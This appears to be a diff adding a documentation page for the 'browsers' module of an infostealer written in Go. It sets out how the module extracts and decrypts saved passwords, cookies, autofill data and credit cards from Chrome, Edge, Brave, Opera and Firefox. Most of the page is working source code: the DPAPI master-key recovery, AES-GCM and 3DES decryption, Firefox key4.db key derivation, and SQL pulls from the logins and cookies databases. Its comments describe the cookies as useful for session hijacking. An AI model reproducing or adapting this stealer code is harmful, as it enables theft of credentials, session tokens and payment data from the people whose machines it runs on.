@@ -1,0 +1,486 @@
+---
+title: "Browser Data Extraction"
+description: "Documentation for the browsers module - extracting passwords, cookies, history, autofill, and credit cards from Chromium and Firefox browsers"
+---
+
+## Overview
+
+The `browsers` module extracts sensitive data from both Chromium-based browsers (Chrome, Edge, Brave, Opera, etc.) and Firefox. It handles credential decryption using DPAPI and AES-GCM encryption schemes.
+
+<Note>
+Chrome changed encryption in version 80 from DPAPI to AES-GCM (v10/v11 format). The module supports both legacy and modern encryption.
+</Note>
+
+## Supported Browsers
+
+<Tabs>
+  <Tab title="Chromium-based">
+    - **Chrome** - Google Chrome
+    - **Edge** - Microsoft Edge
+    - **Brave** - Privacy-focused browser
+    - **Opera / Opera GX** - Gaming-optimized browser
+    - **Vivaldi** - Power user browser
+    - **Yandex** - Russian browser (surprisingly common)
+    - **Chromium** - Base Chromium builds
+  </Tab>
+  <Tab title="Firefox-based">
+    - **Firefox** - Mozilla Firefox
+    - Uses 3DES-CBC encryption with NSS key database
+    - Stores credentials in `logins.json` and `key4.db`
+  </Tab>
+</Tabs>
+
+## Data Structures
+
+### BrowserData
+
+Main structure containing all extracted browser data.
+
+<ParamField path="Passwords" type="[]Password">
+  Array of extracted login credentials
+</ParamField>
+
+<ParamField path="Cookies" type="[]Cookie">
+  Browser cookies (valuable for session hijacking)
+</ParamField>
+
+<ParamField path="History" type="[]HistoryEntry">
+  Browsing history (limited to top 500 most visited)
+</ParamField>
+
+<ParamField path="Autofill" type="[]AutofillEntry">
+  Saved autofill data (names, addresses, phone numbers)
+</ParamField>
+
+<ParamField path="CreditCards" type="[]CreditCard">
+  Saved credit card information
+</ParamField>
+
+### Password
+
+```go browsers/chromium.go:39-44
+type Password struct {
+    URL      string
+    Username string
+    Password string
+    Browser  string
+}
+```
+
+### Cookie
+
+```go browsers/chromium.go:46-55
+type Cookie struct {
+    Host       string
+    Name       string
+    Value      string
+    Path       string
+    Expires    int64
+    IsSecure   bool
+    IsHTTPOnly bool
+    Browser    string
+}
+```
+
+### CreditCard
+
+```go browsers/chromium.go:71-77
+type CreditCard struct {
+    Name     string
+    Number   string // decrypted
+    ExpMonth string
+    ExpYear  string
+    Browser  string
+}
+```
+
+## Key Functions
+
+### StealAll()
+
+Main entry point that extracts data from all installed browsers.
+
+```go browsers/chromium.go:115-160
+func StealAll() *BrowserData {
+    data := &BrowserData{}
+
+    // iterate through all supported browsers
+    for _, profile := range chromiumProfiles {
+        // check if this browser is installed
+        if _, err := os.Stat(profile.ProfilePath); os.IsNotExist(err) {
+            continue // not installed, skip
+        }
+
+        // get the master key from Local State
+        masterKey := getMasterKey(profile.ProfilePath, profile.LocalState)
+        if masterKey == nil {
+            continue // can't decrypt without key
+        }
+
+        // find all profiles (Default, Profile 1, Profile 2, etc.)
+        profiles := findProfiles(profile.ProfilePath)
+        for _, p := range profiles {
+            // extract all the juicy data
+            passwords := stealPasswords(p, masterKey, profile.Browser)
+            data.Passwords = append(data.Passwords, passwords...)
+
+            cookies := stealCookies(p, masterKey, profile.Browser)
+            data.Cookies = append(data.Cookies, cookies...)
+            // ... more extraction
+        }
+    }
+
+    // Firefox is totally different, handle separately
+    firefoxData := stealFirefox()
+    data.Passwords = append(data.Passwords, firefoxData.Passwords...)
+    // ...
+
+    return data
+}
+```
+
+### getMasterKey()
+
+Extracts the AES encryption key from Chrome's `Local State` file. The key is stored encrypted with DPAPI.
+
+```go browsers/chromium.go:164-206
+func getMasterKey(browserPath, localStateFile string) []byte {
+    localStatePath := filepath.Join(browserPath, localStateFile)
+    content, err := os.ReadFile(localStatePath)
+    if err != nil {
+        return nil
+    }
+
+    // Local State is a JSON file
+    var localState map[string]interface{}
+    if err := json.Unmarshal(content, &localState); err != nil {
+        return nil
+    }
+
+    // key is in os_crypt.encrypted_key
+    osCrypt, ok := localState["os_crypt"].(map[string]interface{})
+    if !ok {
+        return nil
+    }
+
+    encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
+    if !ok {
+        return nil
+    }
+
+    // decode base64
+    encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
+    if err != nil {
+        return nil
+    }
+
+    // first 5 bytes are "DPAPI" prefix, remove it
+    if len(encryptedKey) > 5 && string(encryptedKey[:5]) == "DPAPI" {
+        encryptedKey = encryptedKey[5:]
+    }
+
+    // now decrypt with DPAPI
+    masterKey, err := syscalls.CryptUnprotectData(encryptedKey)
+    if err != nil {
+        return nil
+    }
+
+    return masterKey
+}
+```
+
+### decryptPassword()
+
+Handles Chrome password decryption for both v10/v11 (AES-GCM) and legacy (DPAPI) formats.
+
+```go browsers/chromium.go:291-315
+func decryptPassword(encrypted []byte, masterKey []byte) string {
+    if len(encrypted) < 15 {
+        return ""
+    }
+
+    // Check for v10/v11 prefix (Chrome 80+)
+    if string(encrypted[:3]) == "v10" || string(encrypted[:3]) == "v11" {
+        // v10/v11 format: prefix(3) + nonce(12) + ciphertext
+        nonce := encrypted[3:15]
+        ciphertext := encrypted[15:]
+
+        plaintext, err := aesGCMDecrypt(ciphertext, masterKey, nonce)
+        if err != nil {
+            return ""
+        }
+        return string(plaintext)
+    }
+
+    // Legacy DPAPI encryption (pre-Chrome 80)
+    plaintext, err := syscalls.CryptUnprotectData(encrypted)
+    if err != nil {
+        return ""
+    }
+    return string(plaintext)
+}
+```
+
+<Accordion title="AES-GCM Decryption Implementation">
+```go browsers/dpapi.go:34-59
+func aesGCMDecrypt(ciphertext, key, nonce []byte) ([]byte, error) {
+    if len(key) != 32 {
+        return nil, errors.New("invalid key length")
+    }
+
+    block, err := aes.NewCipher(key)
+    if err != nil {
+        return nil, err
+    }
+
+    aesGCM, err := cipher.NewGCM(block)
+    if err != nil {
+        return nil, err
+    }
+
+    if len(nonce) != aesGCM.NonceSize() {
+        return nil, errors.New("invalid nonce size")
+    }
+
+    plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
+    if err != nil {
+        return nil, err
+    }
+
+    return plaintext, nil
+}
+```
+</Accordion>
+
+## Firefox-Specific Extraction
+
+### Key Derivation
+
+Firefox uses NSS (Network Security Services) for encryption with PBKDF2 and 3DES-CBC.
+
+```go browsers/firefox.go:158-235
+func getFirefoxMasterKey(profilePath string) []byte {
+    key4Path := filepath.Join(profilePath, "key4.db")
+    if _, err := os.Stat(key4Path); os.IsNotExist(err) {
+        return nil
+    }
+
+    // ... open SQLite database
+
+    // get global salt and encrypted data from metadata table
+    var item1, item2 []byte
+    err = db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'").Scan(&item1, &item2)
+
+    // get the encrypted master key from nssPrivate table
+    var a11 []byte
+    err = db.QueryRow("SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL").Scan(&a11)
+
+    globalSalt := item1
+
+    // derive key using PBKDF2 with SHA1
+    // Firefox uses: HP = SHA1(globalSalt || password)
+    // then: CHP = SHA1(HP || entrySalt)
+    // then: PBKDF2(CHP, entrySalt, iterations, keyLen)
+    hp := sha1.Sum(append(globalSalt, []byte("")...)) // empty password
+    chp := sha1.Sum(append(hp[:], decodedItem2.Salt...))
+
+    k1 := pbkdf2.Key(chp[:], decodedItem2.Salt, decodedItem2.Rounds, 32, sha1.New)
+
+    // generate k2 using HMAC
+    k2 := hmac.New(sha1.New, k1)
+    k2.Write(decodedItem2.IV)
+    k := k2.Sum(nil)
+
+    // decrypt a11 to get master key
+    masterKey := decryptTripleDES(a11, k[:24], decodedItem2.IV)
+
+    return masterKey[:24]
+}
+```
+
+### 3DES Decryption
+
+```go browsers/firefox.go:304-341
+func decryptTripleDES(ciphertext, key, iv []byte) []byte {
+    if len(key) < 24 {
+        // pad key to 24 bytes for 3DES
+        paddedKey := make([]byte, 24)
+        copy(paddedKey, key)
+        key = paddedKey
+    }
+
+    block, err := des.NewTripleDESCipher(key[:24])
+    if err != nil {
+        return nil
+    }
+
+    if len(iv) == 0 || len(iv) < 8 {
+        iv = make([]byte, 8)
+    }
+
+    // CBC mode decryption
+    mode := cipher.NewCBCDecrypter(block, iv[:8])
+
+    plaintext := make([]byte, len(ciphertext))
+    mode.CryptBlocks(plaintext, ciphertext)
+
+    // remove PKCS7 padding
+    plaintext = pkcs7Unpad(plaintext)
+
+    return plaintext
+}
+```
+
+## Database Extraction
+
+<Warning>
+Chrome locks SQLite databases while running. The module copies files to temp before opening them.
+</Warning>
+
+### Password Extraction
+
+```go browsers/chromium.go:238-287
+func stealPasswords(profilePath string, masterKey []byte, browser string) []Password {
+    var passwords []Password
+
+    loginDataPath := filepath.Join(profilePath, "Login Data")
+    if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
+        return passwords
+    }
+
+    // Chrome locks the database while running, so we copy it first
+    tempPath := filepath.Join(os.TempDir(), "login_data_"+browser)
+    copyFile(loginDataPath, tempPath)
+    defer os.Remove(tempPath)
+
+    db, err := sql.Open("sqlite3", tempPath)
+    if err != nil {
+        return passwords
+    }
+    defer db.Close()
+
+    // the logins table has what we need
+    rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
+    if err != nil {
+        return passwords
+    }
+    defer rows.Close()
+
+    for rows.Next() {
+        var url, username string
+        var passwordBlob []byte
+
+        if err := rows.Scan(&url, &username, &passwordBlob); err != nil {
+            continue
+        }
+
+        // decrypt the password
+        password := decryptPassword(passwordBlob, masterKey)
+        if password != "" {
+            passwords = append(passwords, Password{
+                URL:      url,
+                Username: username,
+                Password: password,
+                Browser:  browser,
+            })
+        }
+    }
+
+    return passwords
+}
+```
+
+### Cookie Extraction
+
+Cookies use the same encryption as passwords and are valuable for session hijacking.
+
+```go browsers/chromium.go:319-384
+func stealCookies(profilePath string, masterKey []byte, browser string) []Cookie {
+    var cookies []Cookie
+
+    // Chrome moved cookies to Network subfolder at some point
+    cookiePaths := []string{
+        filepath.Join(profilePath, "Network", "Cookies"), // newer chrome
+        filepath.Join(profilePath, "Cookies"),            // older chrome
+    }
+
+    // ... find correct path and copy database
+
+    rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
+    if err != nil {
+        return cookies
+    }
+    defer rows.Close()
+
+    for rows.Next() {
+        var host, name, path string
+        var encryptedValue []byte
+        var expires int64
+        var isSecure, isHTTPOnly int
+
+        if err := rows.Scan(&host, &name, &encryptedValue, &path, &expires, &isSecure, &isHTTPOnly); err != nil {
+            continue
+        }
+
+        value := decryptPassword(encryptedValue, masterKey)
+        if value != "" {
+            cookies = append(cookies, Cookie{
+                Host:       host,
+                Name:       name,
+                Value:      value,
+                Path:       path,
+                Expires:    expires,
+                IsSecure:   isSecure == 1,
+                IsHTTPOnly: isHTTPOnly == 1,
+                Browser:    browser,
+            })
+        }
+    }
+
+    return cookies
+}
+```
+
+## Browser Profiles
+
+Chrome uses "Default" for the first profile, then "Profile 1", "Profile 2", etc.
+
+```go browsers/chromium.go:95-112
+var chromiumProfiles = []BrowserProfile{
+    {Name: "Chrome", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"), LocalState: "Local State", Browser: "Chrome"},
+    {Name: "Edge", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"), LocalState: "Local State", Browser: "Edge"},
+    {Name: "Brave", ProfilePath: filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"), LocalState: "Local State", Browser: "Brave"},
+    {Name: "Opera", ProfilePath: filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"), LocalState: "Local State", Browser: "Opera"},
+    // ... more browsers
+}
+```
+
+## Technical Details
+
+<Accordion title="Chrome Encryption Timeline">
+- **Pre-Chrome 80**: Pure DPAPI encryption
+- **Chrome 80+**: AES-256-GCM with DPAPI-protected master key
+- Master key stored in `Local State` JSON file
+- Format: `"DPAPI" + base64(DPAPI-encrypted-key)`
+</Accordion>
+
+<Accordion title="Firefox NSS Database">
+- Uses SQLite database `key4.db` for key storage
+- Credentials stored in `logins.json` 
+- Encryption: PBKDF2 + 3DES-CBC
+- Supports master password (empty by default)
+</Accordion>
+
+<Accordion title="Database Tables">
+**Chromium:**
+- `logins` - Passwords (Login Data)
+- `cookies` - Cookies (Cookies or Network/Cookies)
+- `urls` - History (History)
+- `autofill` - Form data (Web Data)
+- `credit_cards` - Payment methods (Web Data)
+
+**Firefox:**
+- `logins.json` - Login credentials
+- `cookies.sqlite` - Cookie data
+- `places.sqlite` - History and bookmarks
+</Accordion>
